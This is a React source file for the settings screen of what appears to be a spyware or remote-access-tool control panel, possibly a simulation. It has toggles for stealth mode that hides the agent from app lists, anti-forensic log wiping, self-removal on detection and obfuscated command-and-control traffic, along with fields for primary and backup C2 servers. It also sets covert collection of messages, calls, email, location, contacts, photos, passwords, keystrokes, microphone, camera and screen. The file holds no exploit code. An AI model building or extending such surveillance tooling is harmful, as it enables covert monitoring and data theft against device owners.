import React, { useState } from 'react';
import { useSettingsStore } from '@/stores/settingsStore';
import { DataEditorPanel } from './DataEditorPanel';
import { PhoneScanSettings } from './PhoneScanSettings';
import './SettingsPanel.css';

export const SettingsPanel: React.FC = () => {
  const { settings, updateOpSec, updateC2, updateDataCollection, resetSettings } = useSettingsStore();
  const [activeTab, setActiveTab] = useState<'opsec' | 'data' | 'simulation'>('opsec');
  
  const handleSave = () => {
    alert('Settings saved successfully!');
  };
  
  return (
    <div className="settings-panel">
      <div className="panel-header">
        <div>
          <div className="panel-title">
            <span className="icon">⚙️</span> Settings & Configuration
          </div>
          <div className="panel-subtitle">Operational security and system preferences</div>
        </div>
        <button className="btn-save-changes" onClick={handleSave}>
  Save Changes
</button>
      </div>
      
      <div className="settings-tabs">
        <button 
          className={`settings-tab ${activeTab === 'opsec' ? 'active' : ''}`}
          onClick={() => setActiveTab('opsec')}
        >
          🛡️ OpSec & C2
        </button>
        <button 
          className={`settings-tab ${activeTab === 'data' ? 'active' : ''}`}
          onClick={() => setActiveTab('data')}
        >
          📊 Data Collection
        </button>
        <button 
          className={`settings-tab ${activeTab === 'simulation' ? 'active' : ''}`}
          onClick={() => setActiveTab('simulation')}
        >
          🎮  Data Review
        </button>
      </div>

      {/* ... other settings sections ... */}
<div className="settings-section">
  <PhoneScanSettings />
</div>
      
      <div className="scroll-content">
        {activeTab === 'opsec' && (
          <div className="grid-2">
            <div className="card">
              <div className="card-header">
                <div className="card-title">Operational Security</div>
              </div>
              <div className="settings-list">
                <div className="setting-item">
                  <div className="setting-info">
                    <div className="setting-name">Auto-destruct on Detection</div>
                    <div className="setting-desc">Remove agent if tampering detected</div>
                  </div>
                  <label className="toggle-switch">
                    <input 
                      type="checkbox" 
                      checked={settings.opsec.autoDestruct} 
                      onChange={(e) => updateOpSec('autoDestruct', e.target.checked)}
                    />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                
                <div className="setting-item">
                  <div className="setting-info">
                    <div className="setting-name">Traffic Obfuscation</div>
                    <div className="setting-desc">Mask C2 communications</div>
                  </div>
                  <label className="toggle-switch">
                    <input 
                      type="checkbox" 
                      checked={settings.opsec.trafficObfuscation} 
                      onChange={(e) => updateOpSec('trafficObfuscation', e.target.checked)}
                    />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                
                <div className="setting-item">
                  <div className="setting-info">
                    <div className="setting-name">Stealth Mode</div>
                    <div className="setting-desc">Hide from device app lists</div>
                  </div>
                  <label className="toggle-switch">
                    <input 
                      type="checkbox" 
                      checked={settings.opsec.stealthMode} 
                      onChange={(e) => updateOpSec('stealthMode', e.target.checked)}
                    />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                
                <div className="setting-item">
                  <div className="setting-info">
                    <div className="setting-name">Encrypted Storage</div>
                    <div className="setting-desc">AES-256 all extracted data</div>
                  </div>
                  <label className="toggle-switch">
                    <input 
                      type="checkbox" 
                      checked={settings.opsec.encryptedStorage} 
                      onChange={(e) => updateOpSec('encryptedStorage', e.target.checked)}
                    />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                
                <div className="setting-item">
                  <div className="setting-info">
                    <div className="setting-name">Anti-Forensics</div>
                    <div className="setting-desc">Wipe logs on exit</div>
                  </div>
                  <label className="toggle-switch">
                    <input 
                      type="checkbox" 
                      checked={settings.opsec.antiForensics} 
                      onChange={(e) => updateOpSec('antiForensics', e.target.checked)}
                    />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
              </div>
            </div>
            
            <div className="card">
              <div className="card-header">
                <div className="card-title">C2 Server Configuration</div>
              </div>
              <div className="form-row">
                <label className="form-label">Primary C2 Server</label>
                <input 
                  className="form-input" 
                  value={settings.c2.primary} 
                  onChange={(e) => updateC2('primary', e.target.value)}
                />
              </div>
              <div className="form-row">
                <label className="form-label">Backup C2</label>
                <input 
                  className="form-input" 
                  value={settings.c2.backup} 
                  onChange={(e) => updateC2('backup', e.target.value)}
                />
              </div>
              <div className="form-row">
                <label className="form-label">Sync Interval</label>
                <select 
                  className="form-select" 
                  value={settings.c2.syncInterval} 
                  onChange={(e) => updateC2('syncInterval', parseInt(e.target.value))}
                >
                  <option value={15}>Every 15 min</option>
                  <option value={30}>Every 30 min</option>
                  <option value={0}>Real-time</option>
                </select>
              </div>
              <div className="form-row">
                <label className="form-label">Encryption Key (AES-256)</label>
                <div className="encryption-key">
                  {settings.c2.encryptionKey}
                </div>
              </div>
            </div>
          </div>
        )}
        
        {activeTab === 'data' && (
          <div className="card">
            <div className="card-header">
              <div className="card-title">Data Collection Preferences</div>
            </div>
            <div className="data-collection-grid">
              <div className="collection-category">
                <div className="category-title">Communications</div>
                <div className="collection-item">
                  <span>Messages</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.messages} onChange={(e) => updateDataCollection('messages', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                <div className="collection-item">
                  <span>Calls</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.calls} onChange={(e) => updateDataCollection('calls', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                <div className="collection-item">
                  <span>Email</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.email} onChange={(e) => updateDataCollection('email', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
              </div>
              
              <div className="collection-category">
                <div className="category-title">Tracking</div>
                <div className="collection-item">
                  <span>Location</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.location} onChange={(e) => updateDataCollection('location', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                <div className="collection-item">
                  <span>Browser History</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.browserHistory} onChange={(e) => updateDataCollection('browserHistory', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                <div className="collection-item">
                  <span>Contacts</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.contacts} onChange={(e) => updateDataCollection('contacts', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
              </div>
              
              <div className="collection-category">
                <div className="category-title">Sensitive Data</div>
                <div className="collection-item">
                  <span>Photos</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.photos} onChange={(e) => updateDataCollection('photos', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                <div className="collection-item">
                  <span>Keylogger</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.keylogger} onChange={(e) => updateDataCollection('keylogger', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                <div className="collection-item">
                  <span>Passwords</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.passwords} onChange={(e) => updateDataCollection('passwords', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
              </div>
              
              <div className="collection-category">
                <div className="category-title">Remote Access</div>
                <div className="collection-item">
                  <span>Microphone</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.microphone} onChange={(e) => updateDataCollection('microphone', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                <div className="collection-item">
                  <span>Camera</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.camera} onChange={(e) => updateDataCollection('camera', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
                <div className="collection-item">
                  <span>Screen Capture</span>
                  <label className="toggle-switch small">
                    <input type="checkbox" checked={settings.dataCollection.screenCapture} onChange={(e) => updateDataCollection('screenCapture', e.target.checked)} />
                    <span className="toggle-slider"></span>
                  </label>
                </div>
              </div>
            </div>
          </div>
        )}
        
        {activeTab === 'simulation' && <DataEditorPanel />}
        
        <div className="card">
          <div className="card-header">
            <div className="card-title">Danger Zone</div>
          </div>
          <div className="danger-zone">
            <button className="btn btn-danger" onClick={resetSettings}>
              Reset to Default Settings
            </button>
            <button className="btn btn-danger" onClick={() => {
              if (confirm('This will reset ALL simulated data to factory defaults. Are you sure?')) {
                localStorage.clear();
                window.location.reload();
              }
            }}>
              Factory Reset System
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
